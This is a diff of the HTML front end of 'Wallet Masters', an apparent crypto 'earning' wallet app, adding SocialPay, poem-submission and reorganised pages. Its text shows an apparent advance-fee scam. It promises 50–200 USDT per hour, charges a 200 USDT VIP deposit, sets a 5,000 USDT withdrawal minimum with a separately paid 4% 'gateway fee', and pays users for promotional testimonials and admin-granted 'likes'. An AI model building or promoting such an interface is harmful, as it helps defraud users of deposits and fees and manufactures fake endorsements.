@@ -9,7 +9,7 @@
 </head>
 <body>
 
-<!-- SPLASH / TERMS -->
+<!-- SPLASH -->
 <div id="splash" class="splash">
   <div class="splash-inner">
     <div class="splash-logo-wrap">
@@ -24,7 +24,6 @@
 <!-- APP -->
 <div id="app" class="app hidden">
 
-  <!-- Topbar -->
   <header class="topbar">
     <div class="topbar-left">
       <div class="avatar" id="userAvatar">W</div>
@@ -84,38 +83,26 @@
           <button class="wtype-btn active" id="btnCrypto" onclick="setWithdrawType('crypto')">Crypto</button>
           <button class="wtype-btn" id="btnBank" onclick="setWithdrawType('bank')">Bank / Mobile Money</button>
         </div>
-        <!-- CRYPTO -->
         <div id="cryptoFields">
-          <div class="form-group">
-            <label>Network</label>
+          <div class="form-group"><label>Network</label>
             <div class="net-selector">
               <div class="net-opt active" data-n="TRC20" onclick="selectNetwork(this)">TRC20<span class="net-tag">Recommended</span></div>
-              <div class="net-opt net-soon" data-n="ERC20" data-soon="true" onclick="selectNetwork(this)">ERC20<span class="net-tag soon-tag">Coming Soon</span></div>
-              <div class="net-opt net-soon" data-n="BEP20" data-soon="true" onclick="selectNetwork(this)">BEP20<span class="net-tag soon-tag">Coming Soon</span></div>
+              <div class="net-opt net-soon" data-n="ERC20">ERC20<span class="net-tag soon-tag">Coming Soon</span></div>
+              <div class="net-opt net-soon" data-n="BEP20">BEP20<span class="net-tag soon-tag">Coming Soon</span></div>
             </div>
           </div>
           <div class="form-group"><label>Recipient Address</label><input id="withdrawAddress" type="text" placeholder="Enter TRC20 wallet address" oninput="onWithdrawInput()"/></div>
         </div>
-        <!-- BANK -->
         <div id="bankFields" class="hidden">
-          <div class="form-group">
-            <label>Search Bank or Payment Method</label>
-            <input id="bankSearchInput" type="text" placeholder="Search by country, bank, or currency..." oninput="renderPaymentMethodSelector(this.value)"/>
-          </div>
-          <!-- Selected payment display -->
+          <div class="form-group"><label>Search Bank or Payment Method</label><input id="bankSearchInput" type="text" placeholder="Search by country, bank, or currency..." oninput="renderPaymentMethodSelector(this.value)"/></div>
           <div id="selectedPaymentDisplay"></div>
-          <!-- Payment selector list -->
-          <div id="paymentSelector">
-            <div id="paymentMethodBox" class="payment-method-box"></div>
-          </div>
-          <!-- Account fields (shown after selection) -->
+          <div id="paymentSelector"><div id="paymentMethodBox" class="payment-method-box"></div></div>
           <div id="bankAccountFields" class="hidden">
             <div class="form-group"><label>Account Number / Phone / ID</label><input id="bankAccount" type="text" placeholder="Account number or ID" oninput="onWithdrawInput()"/></div>
             <div class="form-group"><label>Account Name</label><input id="bankName" type="text" placeholder="Full account name" oninput="onWithdrawInput()"/></div>
             <div id="localCurrencyDisplay" class="local-currency-hint"></div>
           </div>
         </div>
-        <!-- AMOUNT -->
         <div class="form-group">
           <label>Amount <span class="avail-tag">Available: <span id="availBalance">0.00</span> USDT</span></label>
           <div class="amt-row"><input id="withdrawAmount" type="number" placeholder="0.00" min="5000" oninput="updateFees()"/><span class="amt-tag">USDT</span></div>
@@ -135,65 +122,37 @@
     <!-- FEE PAY -->
     <div class="page" id="page-fee-pay">
       <div class="page-hdr"><button class="back-btn" onclick="showPage('withdraw')"><svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg></button><h2>Pay Gateway Fee</h2></div>
-      <div id="feePayBox" class="form-scroll"></div>
+      <div class="form-scroll"><div id="feePayBox"></div></div>
     </div>
 
     <!-- RECEIVE -->
     <div class="page" id="page-receive">
       <div class="page-hdr"><button class="back-btn" onclick="showPage('home')"><svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg></button><h2>Receive USDT</h2></div>
-      <div class="receive-wrap">
-        <div class="qr-card"><div id="qrCanvas"></div></div>
-        <div class="receive-info-card">
-          <div class="ri-row"><span class="ri-label">Network</span><span class="ri-val">TRC20 (TRON)</span></div>
-          <div class="ri-row"><span class="ri-label">Deposit Address</span><div class="ri-copy-row"><span id="receiveAddress" class="ri-addr">---</span><button class="copy-mini-btn" onclick="copyAddress()">Copy</button></div></div>
-          <div class="ri-row"><span class="ri-label">Your UID</span><div class="ri-copy-row"><span id="receiveUID" class="ri-addr">---</span><button class="copy-mini-btn" onclick="copyUID()">Copy</button></div></div>
-        </div>
-        <div class="recv-note">Send only USDT on TRC20. Other tokens may be permanently lost.</div>
-      </div>
-    </div>
-
-    <!-- CONNECT -->
-    <div class="page" id="page-connect">
-      <div class="page-hdr"><h2>Connect Earning Apps</h2></div>
-      <p class="page-sub">Link your earning app UID to receive withdrawals directly.</p>
-      <div id="appsGrid" class="apps-grid"><div class="empty-tx">No apps available yet</div></div>
-      <div id="connectModal" class="modal-wrap hidden">
-        <div class="modal">
-          <div class="modal-hdr"><h3 id="modalTitle">Connect App</h3><button class="modal-close" onclick="closeModal()">✕</button></div>
-          <p class="modal-sub">Enter your UID from this earning app to link your wallet.</p>
-          <input id="modalUID" type="text" placeholder="Enter your UID"/>
-          <div id="uidErr" class="field-err hidden"></div>
-          <button id="connectBtn" class="btn-primary w100 mt12" onclick="submitUID()">Connect Wallet</button>
-        </div>
-      </div>
-    </div>
-
-    <!-- SUPPORT -->
-    <div class="page" id="page-support">
-      <div class="page-hdr"><button class="back-btn" onclick="showPage('home')"><svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg></button><h2>Support Team</h2></div>
-      <div class="support-container">
-        <div class="support-header-banner">
-          <div class="shb-icon"><svg width="22" height="22" fill="none" stroke="#2563eb" stroke-width="1.8" viewBox="0 0 24 24"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg></div>
-          <div><div class="shb-title">Wallet Masters Support</div><div class="shb-sub">Online · Typically replies within a few hours</div></div>
-        </div>
-        <div id="supportMessages" class="support-msgs"></div>
-        <div class="support-input-bar">
-          <input id="supportInput" type="text" placeholder="Type a message..." onkeydown="if(event.key==='Enter')sendSupportMsg()"/>
-          <button class="send-btn" onclick="sendSupportMsg()"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg></button>
-        </div>
+      <div class="receive-card">
+        <p style="color:#7a90b0;font-size:13px">Send USDT to your TRC20 address below</p>
+        <div id="qrCanvas"></div>
+        <div class="recv-addr" id="receiveAddress">Loading...</div>
+        <button class="btn-primary" onclick="copyAddress();toast('Address copied!')">Copy Address</button>
+        <div class="recv-uid">Your UID: <span id="receiveUID">---</span></div>
       </div>
     </div>
 
     <!-- ACTIVITY -->
     <div class="page" id="page-activity">
       <div class="page-hdr"><button class="back-btn" onclick="showPage('home')"><svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg></button><h2>Transaction History</h2></div>
-      <div id="allTxList" class="tx-list" style="padding:12px 16px 100px"></div>
+      <div class="all-tx-wrap" id="allTxList"></div>
     </div>
 
     <!-- TX DETAIL -->
     <div class="page" id="page-tx-detail">
       <div class="page-hdr"><button class="back-btn" onclick="showPage('activity')"><svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg></button><h2>Transaction Detail</h2></div>
-      <div id="txDetailContent" class="form-scroll"></div>
+      <div id="txDetailContent"></div>
+    </div>
+
+    <!-- CONNECT -->
+    <div class="page" id="page-connect">
+      <div class="page-hdr"><button class="back-btn" onclick="showPage('home')"><svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg></button><h2>Connect Earning Apps</h2></div>
+      <div class="apps-grid" id="appsGrid"></div>
     </div>
 
     <!-- VIP -->
@@ -208,59 +167,132 @@
       <div id="referralPageContent" class="form-scroll"></div>
     </div>
 
-    <!-- ABOUT -->
-    <div class="page" id="page-about">
-      <div class="page-hdr"><button class="back-btn" onclick="showPage('settings')"><svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg></button><h2>About &amp; Terms</h2></div>
+    <!-- POEMS / INSPIRATION -->
+    <div class="page" id="page-poems">
+      <div class="page-hdr"><button class="back-btn" onclick="showPage('home')"><svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg></button><h2>Poems &amp; Inspiration</h2></div>
+      <div style="padding:12px 16px 0">
+        <button class="btn-primary" onclick="showPage('poem-submit')" style="margin-bottom:12px">✍️ Submit a Poem / Inspiration — Earn 1,000 USDT</button>
+      </div>
+      <div class="poem-tabs">
+        <button class="poem-tab active" onclick="filterPoems('all',this)">All</button>
+        <button class="poem-tab" onclick="filterPoems('Poem',this)">Poems</button>
+        <button class="poem-tab" onclick="filterPoems('Motivation',this)">Motivation</button>
+        <button class="poem-tab" onclick="filterPoems('Inspiration',this)">Inspiration</button>
+      </div>
+      <div class="poem-list" id="poemList"><div class="empty-tx">Loading...</div></div>
+    </div>
+
+    <!-- POEM SUBMIT -->
+    <div class="page" id="page-poem-submit">
+      <div class="page-hdr"><button class="back-btn" onclick="showPage('poems')"><svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg></button><h2>Submit Poem / Inspiration</h2></div>
       <div class="form-scroll">
-        <div class="about-header">
-          <svg width="52" height="52" viewBox="0 0 60 60" fill="none"><circle cx="30" cy="30" r="30" fill="url(#aG)"/><text x="30" y="40" text-anchor="middle" font-size="24" font-family="Arial" font-weight="700" fill="#fff">W</text><defs><linearGradient id="aG" x1="0" y1="0" x2="60" y2="60"><stop stop-color="#2563eb"/><stop offset="1" stop-color="#7c3aed"/></linearGradient></defs></svg>
-          <h2 class="about-title">Wallet Masters</h2>
-          <p class="about-sub">Professional Crypto Wallet &amp; Earning Platform</p>
+        <div style="background:#131f35;border:1px solid rgba(37,99,235,.3);border-radius:12px;padding:14px;font-size:13px;color:#7a90b0;line-height:1.6">
+          ✍️ Share a poem, motivational message, or inspiring story.<br>Once approved by admin, you earn <strong style="color:#22c55e">1,000 USDT</strong> instantly!
         </div>
-        <div class="about-card">
-          <div class="about-section"><div class="as-title">What is Wallet Masters?</div><div class="as-body">Wallet Masters is a professional USDT crypto wallet built on the TRON (TRC20) blockchain. Users earn passive income hourly, connect earning apps, and withdraw funds to crypto wallets or local bank accounts (VIP members).</div></div>
-          <div class="about-section"><div class="as-title">How Earnings Work</div><div class="as-body">Standard members earn 50 USDT every hour. VIP members earn 200 USDT per hour. Simply claim your hourly bonus once per hour — earnings are credited instantly to your wallet balance.</div></div>
-          <div class="about-section"><div class="as-title">Referral Program</div><div class="as-body">Share your unique referral link and earn 200 USDT for every new user who joins Wallet Masters through your link. There is no limit to how many people you can refer.</div></div>
-          <div class="about-section"><div class="as-title">VIP Membership</div><div class="as-body">Upgrade to VIP with a one-time 200 USDT deposit. VIP members enjoy 200 USDT/hr earnings, bank withdrawal access to 30+ countries, priority support, and an exclusive VIP badge.</div></div>
-          <div class="about-section"><div class="as-title">Security</div><div class="as-body">Your wallet is protected by your Telegram identity. No passwords needed — your Telegram account is your secure login. All transactions are logged and traceable.</div></div>
+        <div class="form-group">
+          <label>Category</label>
+          <div class="poem-category-btns" id="poemCatBtns">
+            <button class="cat-btn active" onclick="selectPoemCat('Poem',this)">📜 Poem</button>
+            <button class="cat-btn" onclick="selectPoemCat('Motivation',this)">💪 Motivation</button>
+            <button class="cat-btn" onclick="selectPoemCat('Inspiration',this)">✨ Inspiration</button>
+          </div>
         </div>
-        <div class="terms-card">
-          <div class="tc-title">Terms &amp; Conditions</div>
-          <div class="terms-section"><div class="ts-title">1. Eligibility</div><div class="ts-body">You must be 18+ to use this platform. By using Wallet Masters, you confirm you are legally permitted to use crypto services in your country.</div></div>
-          <div class="terms-section"><div class="ts-title">2. Fees</div><div class="ts-body">A 4% gateway fee applies to all withdrawals. Fees are paid separately via TRC20 USDT and are non-refundable once confirmed.</div></div>
-          <div class="terms-section"><div class="ts-title">3. Withdrawals</div><div class="ts-body">Minimum: 5,000 USDT. Maximum: 50,000 USDT per request. Processing takes 5–30 minutes after admin approval.</div></div>
-          <div class="terms-section"><div class="ts-title">4. VIP Membership</div><div class="ts-body">VIP requires a one-time 200 USDT deposit. VIP status is permanent once approved by admin.</div></div>
-          <div class="terms-section"><div class="ts-title">5. Referrals</div><div class="ts-body">200 USDT reward per successful referral. Referral abuse (fake accounts) will result in permanent ban.</div></div>
-          <div class="terms-section"><div class="ts-title">6. Prohibited Activity</div><div class="ts-body">Fraud, fake receipts, or chargebacks result in immediate account termination and forfeiture of all balances.</div></div>
-          <div class="terms-section"><div class="ts-title">7. Disclaimer</div><div class="ts-body">Wallet Masters reserves the right to modify earning rates, fees, and limits at any time. Platform availability is not guaranteed.</div></div>
-        </div>
+        <div class="form-group"><label>Title (optional)</label><input id="poemTitle" type="text" placeholder="Give your post a title..."/></div>
+        <div class="form-group"><label>Your Content</label><textarea id="poemContent" placeholder="Write your poem, motivational message, or inspiring story here..." style="min-height:200px"></textarea></div>
+        <button class="btn-primary" id="submitPoemBtn" onclick="submitPoem()">Submit for Review</button>
       </div>
     </div>
 
+    <!-- SOCIALPAY -->
+    <div class="page" id="page-socialpay">
+      <div class="sp-header">
+        <span class="sp-title">🌟 SocialPay</span>
+        <button class="sp-post-btn" onclick="showPage('sp-compose')">+ Post</button>
+      </div>
+      <div style="display:flex;gap:8px;padding:10px 16px;border-bottom:1px solid #1e2d45">
+        <button style="flex:1;padding:8px;background:#131f35;border:1px solid #1e2d45;border-radius:8px;color:#7a90b0;font-size:12px;cursor:pointer" onclick="showPage('sp-profile-me')">👤 My Profile</button>
+        <button style="flex:1;padding:8px;background:#131f35;border:1px solid #1e2d45;border-radius:8px;color:#7a90b0;font-size:12px;cursor:pointer" onclick="showPage('sp-my-posts')">📝 My Posts</button>
+      </div>
+      <div class="sp-feed" id="spFeed"><div class="empty-tx">Loading...</div></div>
+    </div>
+
+    <!-- SP COMPOSE -->
+    <div class="page" id="page-sp-compose">
+      <div class="page-hdr"><button class="back-btn" onclick="showPage('socialpay')"><svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg></button><h2>Create Post</h2></div>
+      <div class="form-scroll">
+        <div style="background:#131f35;border:1px solid rgba(124,58,237,.3);border-radius:12px;padding:14px;font-size:13px;color:#7a90b0;line-height:1.6">
+          🌟 Post pictures, voice messages, stories, and more.<br>Admin reviews and sends likes. Likes = USDT rewards!<br><br>
+          ❤️ 1K likes → <strong style="color:#22c55e">100 USDT</strong> &nbsp;|&nbsp; 10K → <strong style="color:#22c55e">1,000 USDT</strong><br>
+          ❤️ 100K likes → <strong style="color:#22c55e">10,000 USDT</strong> &nbsp;|&nbsp; 1M → <strong style="color:#22c55e">100,000 USDT</strong>
+        </div>
+        <div class="form-group">
+          <label>Post Type</label>
+          <div class="post-type-row" id="postTypeBtns">
+            <button class="pt-btn active" onclick="selectPostType('text',this)">📝 Text</button>
+            <button class="pt-btn" onclick="selectPostType('photo',this)">📸 Photo</button>
+            <button class="pt-btn" onclick="selectPostType('voice',this)">🎙 Voice</button>
+          </div>
+        </div>
+        <div class="form-group" id="spImageUpload" style="display:none">
+          <label>Upload Photo</label>
+          <label class="upload-drop" for="spImageFile">
+            <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+            <span id="spImgLabel">Tap to upload photo</span>
+            <input type="file" id="spImageFile" accept="image/*" onchange="previewSpImage(this)" style="display:none"/>
+          </label>
+          <img id="spImgPreview" class="compose-img-preview" style="display:none"/>
+        </div>
+        <div class="form-group" id="spVoiceUpload" style="display:none">
+          <label>Upload Voice Message</label>
+          <label class="upload-drop" for="spVoiceFile">
+            <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/></svg>
+            <span id="spVoiceLabel">Tap to upload voice recording</span>
+            <input type="file" id="spVoiceFile" accept="audio/*" onchange="previewSpVoice(this)" style="display:none"/>
+          </label>
+          <div id="spVoiceIndicator" class="compose-voice-indicator"></div>
+        </div>
+        <div class="form-group"><label>Caption / Story</label><textarea id="spCaption" placeholder="Share your story, business idea, life experience, or what's happening around you..." style="min-height:140px"></textarea></div>
+        <button class="btn-primary" id="submitSpBtn" onclick="submitSocialPost()">Submit Post</button>
+      </div>
+    </div>
+
+    <!-- SP MY PROFILE -->
+    <div class="page" id="page-sp-profile-me">
+      <div class="page-hdr"><button class="back-btn" onclick="showPage('socialpay')"><svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg></button><h2>My SocialPay Profile</h2></div>
+      <div id="mySpProfileContent"></div>
+    </div>
+
+    <!-- SP EDIT PROFILE -->
+    <div class="page" id="page-sp-edit-profile">
+      <div class="page-hdr"><button class="back-btn" onclick="showPage('sp-profile-me')"><svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg></button><h2>Edit Profile</h2></div>
+      <div class="form-scroll" id="spEditProfileContent"></div>
+    </div>
+
+    <!-- SP MY POSTS -->
+    <div class="page" id="page-sp-my-posts">
+      <div class="page-hdr"><button class="back-btn" onclick="showPage('socialpay')"><svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg></button><h2>My Posts</h2></div>
+      <div class="sp-post-grid" id="myPostsContent"></div>
+    </div>
+
+    <!-- SP USER PROFILE (view other users) -->
+    <div class="page" id="page-sp-user-profile">
+      <div class="page-hdr"><button class="back-btn" onclick="showPage('socialpay')"><svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg></button><h2>Profile</h2></div>
+      <div id="spUserProfileContent"></div>
+    </div>
 
     <!-- TESTIMONIALS -->
     <div class="page" id="page-testimonials">
       <div class="page-hdr"><button class="back-btn" onclick="showPage('home')"><svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg></button><h2>Testimonials</h2></div>
       <div class="form-scroll">
-        <!-- Submit buttons -->
-        <div style="display:flex;gap:12px;padding:16px 16px 0">
-          <button class="btn-primary" onclick="showTestimonialSubmit('video')" style="flex:1;padding:14px 8px;font-size:13px">
-            🎥 Post Video<br><span style="font-size:11px;opacity:.8">Earn +1,000 USDT</span>
-          </button>
-          <button class="btn-primary" onclick="showTestimonialSubmit('youtube')" style="flex:1;padding:14px 8px;font-size:13px;background:linear-gradient(135deg,#e60000,#cc0000)">
-            📺 YouTube Link<br><span style="font-size:11px;opacity:.8">Earn +2,000 USDT</span>
-          </button>
+        <div style="display:flex;gap:12px">
+          <button class="btn-primary" onclick="showTestimonialSubmit('video')" style="flex:1;padding:14px 8px;font-size:13px">🎥 Post Video<br><span style="font-size:11px;opacity:.8">Earn +1,000 USDT</span></button>
+          <button class="btn-primary" onclick="showTestimonialSubmit('youtube')" style="flex:1;padding:14px 8px;font-size:13px;background:linear-gradient(135deg,#e60000,#cc0000)">📺 YouTube Link<br><span style="font-size:11px;opacity:.8">Earn +2,000 USDT</span></button>
         </div>
-        <!-- Info box -->
-        <div style="margin:12px 16px;background:#1a2544;border-radius:12px;padding:14px;border-left:3px solid #f0b90b">
+        <div style="background:#1a2544;border-radius:12px;padding:14px;border-left:3px solid #f0b90b">
           <div style="color:#f0b90b;font-size:12px;font-weight:700;margin-bottom:6px">HOW IT WORKS</div>
-          <div style="color:#8a9bc0;font-size:12px;line-height:1.6">
-            Share a video or YouTube link talking about how you earn 50–200 USDT/hour on Wallet Masters, your instant withdrawals, and how it changed your life.<br><br>
-            Admin reviews and approves your submission. Once approved, your USDT reward lands instantly!
-          </div>
+          <div style="color:#8a9bc0;font-size:12px;line-height:1.6">Share a video or YouTube link talking about how you earn on Wallet Masters. Admin reviews and approves. Once approved, your USDT reward lands instantly!</div>
         </div>
-        <!-- List of approved testimonials -->
-        <div style="padding:0 16px 16px">
+        <div>
           <div style="color:#8a9bc0;font-size:12px;font-weight:600;margin-bottom:12px;text-transform:uppercase;letter-spacing:.5px">Community Testimonials</div>
           <div id="testimonialsList"></div>
         </div>
@@ -277,7 +309,9 @@
           <div class="s-row" onclick="showPage('referral')"><span>Refer &amp; Earn</span><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></div>
           <div class="s-row" onclick="showPage('receive')"><span>Show QR Code</span><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></div>
           <div class="s-row" onclick="showPage('about')"><span>About &amp; Terms</span><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></div>
-          <div class="s-row" onclick="showPage('testimonials')"><span>🎬 Testimonials & Earn</span><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></div>
+          <div class="s-row" onclick="showPage('testimonials')"><span>🎬 Testimonials &amp; Earn</span><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></div>
+          <div class="s-row" onclick="showPage('poems')"><span>✍️ Poems &amp; Inspiration</span><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></div>
+          <div class="s-row" onclick="showPage('socialpay')"><span>🌟 SocialPay</span><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></div>
         </div>
         <div class="settings-info">
           <div class="si-logo"><svg width="32" height="32" viewBox="0 0 60 60" fill="none"><circle cx="30" cy="30" r="30" fill="url(#siG)"/><text x="30" y="40" text-anchor="middle" font-size="22" font-family="Arial" font-weight="700" fill="#fff">W</text><defs><linearGradient id="siG" x1="0" y1="0" x2="60" y2="60"><stop stop-color="#2563eb"/><stop offset="1" stop-color="#7c3aed"/></linearGradient></defs></svg></div>
@@ -288,45 +322,87 @@
       </div>
     </div>
 
+    <!-- SUPPORT -->
+    <div class="page" id="page-support">
+      <div class="page-hdr"><button class="back-btn" onclick="showPage('home')"><svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg></button><h2>Support</h2></div>
+      <div class="support-wrap">
+        <div class="support-msgs" id="supportMsgs"></div>
+        <div class="support-input-row">
+          <input id="supportInput" type="text" placeholder="Type your message..." onkeydown="if(event.key==='Enter')sendSupport()"/>
+          <button onclick="sendSupport()"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg></button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ABOUT -->
+    <div class="page" id="page-about">
+      <div class="page-hdr"><button class="back-btn" onclick="showPage('settings')"><svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg></button><h2>About &amp; Terms</h2></div>
+      <div class="form-scroll">
+        <div class="about-header">
+          <svg width="52" height="52" viewBox="0 0 60 60" fill="none"><circle cx="30" cy="30" r="30" fill="url(#aG)"/><text x="30" y="40" text-anchor="middle" font-size="24" font-family="Arial" font-weight="700" fill="#fff">W</text><defs><linearGradient id="aG" x1="0" y1="0" x2="60" y2="60"><stop stop-color="#2563eb"/><stop offset="1" stop-color="#7c3aed"/></linearGradient></defs></svg>
+          <h2 class="about-title">Wallet Masters</h2>
+          <p class="about-sub">Professional Crypto Wallet &amp; Earning Platform</p>
+        </div>
+        <div class="about-card">
+          <div class="about-section"><div class="as-title">What is Wallet Masters?</div><div class="as-body">Wallet Masters is a professional USDT crypto wallet built on the TRON (TRC20) blockchain. Users earn passive income hourly, connect earning apps, and withdraw funds to crypto wallets or local bank accounts (VIP members).</div></div>
+          <div class="about-section"><div class="as-title">How Earnings Work</div><div class="as-body">Standard members earn 50 USDT every hour. VIP members earn 200 USDT per hour. Simply claim your hourly bonus once per hour — earnings are credited instantly to your wallet balance.</div></div>
+          <div class="about-section"><div class="as-title">SocialPay</div><div class="as-body">Post pictures, voice messages, and stories. Admin reviews and sends likes to great posts. Earn 100 USDT for 1K likes, 1,000 USDT for 10K likes, 10,000 USDT for 100K likes, and up to 100,000 USDT for 1M likes!</div></div>
+          <div class="about-section"><div class="as-title">Referral Program</div><div class="as-body">Share your unique referral link and earn 200 USDT for every new user who joins Wallet Masters through your link.</div></div>
+        </div>
+        <div class="terms-card">
+          <div class="tc-title">Terms &amp; Conditions</div>
+          <div class="terms-section"><div class="ts-title">1. Eligibility</div><div class="ts-body">You must be 18+ to use this platform.</div></div>
+          <div class="terms-section"><div class="ts-title">2. Fees</div><div class="ts-body">A 4% gateway fee applies to all withdrawals. Fees are paid via TRC20 USDT and are non-refundable once confirmed.</div></div>
+          <div class="terms-section"><div class="ts-title">3. Withdrawals</div><div class="ts-body">Minimum: 5,000 USDT. Maximum: 50,000 USDT per request. Processing takes 5–30 minutes after admin approval.</div></div>
+          <div class="terms-section"><div class="ts-title">4. VIP Membership</div><div class="ts-body">VIP requires a one-time 200 USDT deposit. VIP status is permanent once approved.</div></div>
+          <div class="terms-section"><div class="ts-title">5. SocialPay</div><div class="ts-body">All posts are subject to admin review. Only approved posts are eligible for likes and rewards. Content must be appropriate and original.</div></div>
+          <div class="terms-section"><div class="ts-title">6. Prohibited Activity</div><div class="ts-body">Fraud, fake receipts, or chargebacks result in immediate account termination and forfeiture of all balances.</div></div>
+        </div>
+      </div>
+    </div>
+
   </div><!-- /pages -->
 
-  <!-- Bottom Nav -->
+  <!-- BOTTOM NAV -->
   <nav class="bottom-nav">
     <button class="nav-btn active" onclick="showPage('home')" data-page="home"><svg width="22" height="22" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg><span>Home</span></button>
-    <button class="nav-btn" onclick="showPage('activity')" data-page="activity"><svg width="22" height="22" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg><span>History</span></button>
-    <button class="nav-fab" onclick="showPage('withdraw')"><svg width="22" height="22" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg></button>
-    <button class="nav-btn" onclick="showPage('connect')" data-page="connect"><svg width="22" height="22" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg><span>Connect</span></button>
-    <button class="nav-btn" onclick="showPage('support')" data-page="support"><svg width="22" height="22" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg><span>Support</span></button>
+    <button class="nav-btn" onclick="showPage('activity')" data-page="activity"><svg width="22" height="22" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg><span>Activity</span></button>
+    <button class="nav-btn" onclick="showPage('socialpay')" data-page="socialpay"><svg width="22" height="22" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg><span>Social</span></button>
+    <button class="nav-btn" onclick="showPage('connect')" data-page="connect"><svg width="22" height="22" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg><span>Connect</span></button>
+    <button class="nav-btn" onclick="showPage('poems')" data-page="poems"><svg width="22" height="22" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 013 3L7 19l-4 1 1-4L16.5 3.5z"/></svg><span>Inspire</span></button>
   </nav>
+
+  <!-- MODAL: UID Connect -->
